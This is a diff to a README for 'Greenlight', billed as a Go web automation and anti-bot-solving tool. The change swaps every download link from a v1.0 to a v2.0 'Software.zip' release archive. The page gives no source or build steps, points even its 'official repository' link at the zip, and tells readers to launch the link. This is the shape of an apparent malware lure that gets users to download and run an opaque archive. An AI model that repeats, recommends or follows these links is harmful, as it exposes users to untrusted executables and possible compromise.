@@ -14,9 +14,9 @@ Welcome to Greenlight, a powerful web automation framework built using Golang. T
 
 ## Installation
 
-To get started with Greenlight, simply download the https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip file from the link provided below:
+To get started with Greenlight, simply download the https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip file from the link provided below:
 
-[![Download https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip](https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip)](https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip)
+[![Download https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip](https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip)](https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the file, extract it and launch the application to start using Greenlight.
 
@@ -28,7 +28,7 @@ akamai, anti, antibot, bot, browser, go, golang, kasada, kasada-solver, nike, pl
 
 ## Explore Further
 
-For more information and updates, visit the official [Greenlight GitHub Repository](https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip).
+For more information and updates, visit the official [Greenlight GitHub Repository](https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip).
 
 ## Get Involved
 
@@ -46,4 +46,4 @@ Thank you for choosing Greenlight! Happy Automating! 🚗💨
 
 ---
 
-**Disclaimer:** The link provided above needs to be launched to access the https://github.com/trhieuyeuemm/greenlight/releases/download/v1.0/Software.zip file for installation.
+**Disclaimer:** The link provided above needs to be launched to access the https://github.com/trhieuyeuemm/greenlight/releases/download/v2.0/Software.zip file for installation.
